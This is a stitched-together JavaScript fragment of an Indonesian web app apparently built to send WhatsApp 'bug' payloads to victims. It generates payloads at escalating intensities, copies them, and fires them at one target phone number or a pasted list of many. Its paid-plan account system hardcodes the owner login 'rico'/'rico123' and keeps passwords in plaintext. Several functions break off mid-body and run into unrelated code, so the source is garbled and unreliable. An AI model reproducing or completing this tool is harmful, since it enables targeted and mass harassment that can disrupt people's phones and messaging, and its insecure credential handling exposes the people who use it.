function toast(t){toastEl.textContent=t;toastEl.classList.add('on');clearTimeout(toast._t);toast._t=setTimeout(()=>toastEl.classList.remove('on'),2100);}
function accs(){return LS.get(K_ACC,[]);}
function saveAccs(a){LS.set(K_ACC,a);}
function me(){const s=LS.get(K_SES,null);if(!s)return null;return accs().find(x=>x.u===s.u)||null;}
function favs(){return LS.get(K_FAV,[]);}
function fmt(ts){if(!ts)return 'Permanen';const d=Math.ceil((ts-Date.now())/864e5);if(d<0)return 'Kedaluwarsa';return d+' hari lagi';}
function seed(){
  let a=LS.get(K_ACC,null);
  if(!Array.isArray(a)){a=[{u:'rico',p:'rico123',role:'owner',plan:'OWNER',exp:null,active:true,created:Date.now()}];saveAccs(a);return;}
  if(!a.some(x=>x.role==='owner')){a.unshift({u:'rico',p:'rico123',role:'owner',plan:'OWNER',exp:null,active:true,created:Date.now()});saveAccs(a);}
}
async function copyTxt(t,elId){
  try{await navigator.clipboard.writeText(t);toast('Tersalin');return;}
  catch(e){}
  const ta=document.getElementById(elId||'tp')||document.querySelector('.ta');
  if(ta){try{ta.focus();ta.select();document.execCommand('copy');toast('Tersalin');}catch(_){toast('Tekan lama lalu salin manual');}}
  else toast('Gagal menyalin');
}
function riskLbl(r){return ['','Ringan','Ringan','Sedang','Berat','Fatal'][r];}
function normNum(n){let x=String(n).replace(/\D/g,'');if(x.startsWith('0'))x='62'+x.slice(1);if(x.startsWith('620'))x='62'+x.slice(3);return x;}
function parseNums(s){
  const out=[];
  String(s).split(/[\s,;|\n\r\t]+/).forEach(p=>{
    const n=normNum(p);
    if(n.length>=9&&n.length<=15&&!out.includes(n))out.push(n);
  });
  return out;
}
function genPayload(id,lvl){const b=BUGS.find(x=>x.id===id)||BUGS[0];return b.g(MULT[lvl||'sedang']);}

  const lu=document.getElementById('lu'),lp=document.getElementById('lp');
  document.getElementById('ey').onclick=e=>{lp.type=lp.type==='password'?'text':'password';e.target.textContent=lp.type==='password'?'lihat':'tutup';};

function openBug(id){
  const b=BUGS.find(x=>x.id===id);if(!b)return;
  const payload=b.g(MULT[S.tLvl]);

  const ov=document.createElement('div');
  ov.className='ov';
  ov.innerHTML=`
    <div class="modal">
      <div class="m-top">
        <div>
          <div class="m-n">${esc(b.n)}</div>
          <div style="display:flex;gap:6px;margin-top:7px;flex-wrap:wrap">
            <span class="bdg r${b.risk}">${riskLbl(b.risk)}</span><span class="ct">${CATL[b.cat]}</span>
          </div>
        </div>
        <button class="x" id="cx">✕</button>
      </div>
      <div class="m-d">${esc(b.d)}</div>
      <div class="tip"><b>Intensitas:</b> ${S.tLvl}. <b>Cara pakai:</b> ${esc(b.t)}</div>
      <textarea class="ta" id="pl" readonly>${esc(payload)}</textarea>
      <div class="meta"><span>${payload.length.toLocaleString('id-ID')} karakter</span><span>${CATL[b.cat]}</span></div>
      <div class="row2" style="margin-bottom:9px">
        <button class="btn btn-g sm" id="cp">Salin payload</button>
        <button class="btn btn-g sm" id="lvl">Ganti intensitas</button>
      </div>
      <div class="inp" style="display:flex;align-items:center;gap:8px;margin:0">
        <span style="font-size:12px;color:#a688c9">+62</span>
        <input id="num" placeholder="nomor target" style="flex:1;background:none;border:0;outline:0;color:#f3e9ff;font:inherit;font-size:14px;padding:11px 0">
      </div>
      <div class="row2" style="margin-top:8px">
        <button class="btn btn-p sm" id="send">Tembak nomor ini</button>
        <button class="btn btn-g sm" id="mass">Banyak nomor</button>
      </div>
      <div class="note">Nomor otomatis dinormalkan ke format 62. Payload tersalin sebelum chat dibuka.</div>
    </div>`;
  app.appendChild(ov);

  const close=()=>ov.remove();
  document.getElementById('cx').onclick=close;
  ov.onclick=e=>{if(e.target===ov)close();};
  document.getElementById('cp').onclick=()=>copyTxt(payload,'pl');
  document.getElementById('lvl').onclick=()=>{
    const order=['ringan','sedang','brutal'];
    S.tLvl=order[(order.indexOf(S.tLvl)+1)%3];
    close();openBug(id);toast('Intensitas: '+S.tLvl);
  };
  document.getElementById('send').onclick=()=>{

function jsonp(url){
  return new Promise((res,rej)=>{
    const cb='__cb'+Date.now()+Math.floor(Math.random()*9999);
    const s=document.createElement('script');
    let done=false;
    window[cb]=d=>{done=true;res(d);try{delete window[cb];}catch(e){}s.remove();};
    s.onerror=()=>{if(done)return;done=true;rej(new Error('jsonp'));try{delete window[cb];}catch(e){}s.remove();};
    s.src=url+(url.indexOf('?')>-1?'&':'?')+'callback='+cb;
    (document.head||document.documentElement).appendChild(s);
    setTimeout(()=>{if(!done){done=true;rej(new Error('timeout'));s.remove();}},9000);
  });
}

async function doSearch(){
  const el=document.getElementById('sq');
  const term=(el&&el.value||M.q||'').trim();
  if(!term)return toast('Tulis judul lagu dulu');
  M.q=term;M.busy=true;M.res=[];M.err='';rerenderShell();
  const api='https://itunes.apple.com/search?media=music&entity=song&limit=20&term='+encodeURIComponent(term);
  let data=null;
  try{
    const r=await fetch(api,{mode:'cors'});
    data=await r.json();
  }catch(e1){
    try{ data=await jsonp(api); }
    catch(e2){ M.busy=false;M.err='Pencarian gagal. Cek koneksi lalu coba lagi.';rerenderShell();return; }
  }
  const list=((data&&data.results)||[]).filter(x=>x&&x.previewUrl).map(x=>({
    name:x.trackName||'tanpa judul',
    artist:x.artistName||'',
    url:x.previewUrl,
    art:(x.artworkUrl100||'').replace('100x100','200x200')
  }));
  M.res=list;M.busy=false;
  if(!list.length)M.err='Tidak ada hasil untuk "'+term+'".';
  rerenderShell();
}

function downloadApp(){
  let html;
  try{
    const clone=document.documentElement.cloneNode(true);
    ['#pwa-manifest','#apple-icon','#theme-meta'].forEach(sel=>{
      const el=clone.querySelector(sel);if(el)el.remove();
    });
    html='<!DOCTYPE html>\n'+clone.outerHTML;
  }catch(e){return toast('Gagal menyiapkan file');}

  const url=URL.createObjectURL(new Blob([html],{type:'text/html'}));
  try{
    const a=document.createElement('a');
    a.href=url;a.download='index.html';
    document.body.appendChild(a);a.click();a.remove();
    toast('File siap diunduh');
  }catch(e){}

  const out=document.getElementById('dlout');
  if(out){
    out.innerHTML=`<div class="dlbox">
      <div>Kalau unduhan tidak jalan:</div>
      <a class="btn btn-g sm" href="${url}" target="_blank" rel="noopener" style="margin-top:8px">Buka file di tab baru</a>
      <button class="btn btn-g sm" id="cphtml" style="margin-top:8px">Salin seluruh kode aplikasi</button>
      <div class="note">Di tab baru, buka menu browser lalu pilih Unduh atau Simpan halaman.</div>
    </div>`;
    const b=document.getElementById('cphtml');
    if(b)b.onclick=()=>copyTxt(html);
  }
}

    if(np.length<4)return toast('Password minimal 4 karakter');
    if(accs().some(x=>x.u.toLowerCase()===nu.toLowerCase()))return toast('Username sudah dipakai');
    const arr=accs();
    arr.push({u:nu,p:np,role:'member',plan:pl,exp:dd?Date.now()+dd*864e5:null,active:true,created:Date.now()});
    saveAccs(arr);viewOwner(v);toast('Akun '+nu+' dibuat');
  };

  document.getElementById('exp').onclick=()=>{
    const data=JSON.stringify(accs(),null,2);
    try{
      const b=new Blob([data],{type:'application/json'});
      const url=URL.createObjectURL(b);const a2=document.createElement('a');
      a2.href=url;a2.download='akun-ricostudent.json';a2.click();URL.revokeObjectURL(url);
      toast('File cadangan diunduh');
    }catch(e){copyTxt(data);}
  };
  document.getElementById('imp').onclick=()=>{
    const s=prompt('Tempel isi JSON cadangan:');if(!s)return;
    try{
      const d=JSON.parse(s);
      if(!Array.isArray(d))throw 0;
      saveAccs(d);seed();viewOwner(v);toast('Data dipulihkan');
    }catch(e){toast('JSON tidak valid');}
  };
}

    <div class="av ${u.role==='owner'?'own':''}" style="width:48px;height:48px;font-size:18px;border-radius:15px">${esc(u.u[0].toUpperCase())}</div>
    <div style="flex:1">
      <div style="font-size:16px;font-weight:600">${esc(u.u)}</div>
      <div class="rl ${u.role==='owner'?'own':''}">${u.role==='owner'?'owner · akses penuh':'member'}</div>
    </div>
  </div>
  <div class="panel">
    <div style="display:flex;justify-content:space-between;font-size:13px;margin-bottom:9px">
      <span style="color:#a688c9">Paket</span><span>${u.role==='owner'?'Owner':esc(u.plan)}</span>
    </div>
    <div style="display:flex;justify-content:space-between;font-size:13px">
      <span style="color:#a688c9">Masa aktif</span><span>${u.role==='owner'?'Tanpa batas':fmt(u.exp)}</span>
    </div>
  </div>

  <div class="sec-t">Ganti password</div>
  <div class="panel">
    <input class="inp" id="op" type="password" placeholder="password lama">
    <input class="inp" id="npw" type="password" placeholder="password baru">

  </div>

  <div class="sec-t">Statistik kamu</div>
  <div class="panel" style="display:flex;justify-content:space-between;font-size:13px">
    <span style="color:#a688c9">Modul favorit</span><span>${favs().length}</span>
  </div>

  <div class="sec-t">File aplikasi</div>
  <button class="btn btn-g sm" id="dl">Unduh file index.html</button>

  <button class="btn btn-d" id="out" style="margin-top:18px">Keluar akun</button>
  <div class="foot">𝙧𝙞𝙘𝙤✗𝙨𝙩𝙪𝙙𝙚𝙣𝙩 ⸸⁶⁶⁶</div>`;

  document.getElementById('dl').onclick=downloadApp;
  document.getElementById('chg').onclick=()=>{
    const o=document.getElementById('op').value,n=document.getElementById('npw').value;
    if(o!==u.p)return toast('Password lama salah');
    if(n.length<4)return toast('Password baru minimal 4 karakter');
    const a=accs();const t=a.find(x=>x.u===u.u);t.p=n;saveAccs(a);toast('Password diperbarui');
    document.getElementById('op').value='';document.getElementById('npw').value='';
  };
  document.getElementById('out').onclick=()=>{
    localStorage.removeItem(K_SES);
    S={tab:'bug',cat:'all',q:'',favOnly:false,tNums:'',tBug:'lw',tLvl:'sedang',tPre:true,tDone:{}};
    render();
  };
}

function render(){
  seed();
  const u=me();
  if(!u){localStorage.removeItem(K_SES);viewLogin();return;}
  if(S.tab==='owner'&&u.role!=='owner')S.tab='bug';
  viewShell();
}

app.addEventListener('click',e=>{
  const t=e.target.closest('[data-tab],[data-cat],[data-bug],[data-favbtn],[data-fav],[data-tog],[data-rst],[data-del],[data-tfire]');
  if(!t)return;
  if(t.dataset.tab){S.tab=t.dataset.tab;render();return;}
  if(t.dataset.cat){S.cat=t.dataset.cat;render();return;}
  if(t.dataset.fav){S.favOnly=!S.favOnly;render();return;}
  if(t.dataset.favbtn){
    e.stopPropagation();
    const id=t.dataset.favbtn,f=favs();
    const i=f.indexOf(id);
    if(i<0)f.push(id);else f.splice(i,1);
    LS.set(K_FAV,f);
    t.classList.toggle('on');
    if(S.favOnly)render();
    return;
  }
  if(t.dataset.bug){openBug(t.dataset.bug);return;}
  if(t.dataset.tfire){fireOne(+t.dataset.tfire);return;}
  if(t.dataset.tog){
    const a=accs();const x=a.find(z=>z.u===t.dataset.tog);x.active=!x.active;saveAccs(a);render();return;
  }
  if(t.dataset.rst){
    const nw=prompt('Password baru untuk '+t.dataset.rst+':');
    if(!nw||nw.length<4)return toast('Minimal 4 karakter');
    const a=accs();a.find(z=>z.u===t.dataset.rst).p=nw;saveAccs(a);toast('Password direset');return;
  }
  if(t.dataset.del){
    if(!confirm('Hapus akun '+t.dataset.del+'?'))return;
    saveAccs(accs().filter(z=>z.u!==t.dataset.del));render();toast('Akun dihapus');
  }
});

(function setupPWA(){
  try{
    const c=document.createElement('canvas');c.width=c.height=512;
    const x=c.getContext('2d');
    const g=x.createLinearGradient(0,0,512,512);
    g.addColorStop(0,'#7c3aed');g.addColorStop(1,'#c026d3');
    x.fillStyle=g;x.fillRect(0,0,512,512);
    x.fillStyle='rgba(255,255,255,.95)';
    x.beginPath();
    x.moveTo(285,90);x.lineTo(200,250);x.lineTo(258,250);x.lineTo(222,410);
    x.lineTo(330,225);x.lineTo(268,225);x.closePath();x.fill();
    const icon=c.toDataURL('image/png');

    const mf={name:'rico student bug wa',short_name:'rico bug',start_url:'.',scope:'.',
      display:'standalone',orientation:'portrait',background_color:'#0a0512',theme_color:'#7c3aed',
      icons:[{src:icon,sizes:'512x512',type:'image/png',purpose:'any maskable'},
             {src:icon,sizes:'192x192',type:'image/png'}]};
    const blob=new Blob([JSON.stringify(mf)],{type:'application/json'});
    const l=document.createElement('link');
    l.id='pwa-manifest';l.rel='manifest';l.href=URL.createObjectURL(blob);
    (document.head||document.documentElement).appendChild(l);

    const tm=document.createElement('meta');tm.id='theme-meta';tm.name='theme-color';tm.content='#7c3aed';
    (document.head||document.documentElement).appendChild(tm);
    const am=document.createElement('meta');am.name='apple-mobile-web-app-capable';am.content='yes';
    (document.head||document.documentElement).appendChild(am);
    const at=document.createElement('link');at.id='apple-icon';at.rel='apple-touch-icon';at.href=icon;
    (document.head||document.documentElement).appendChild(at);
  }catch(e){}
})();

render();
})();
</script>
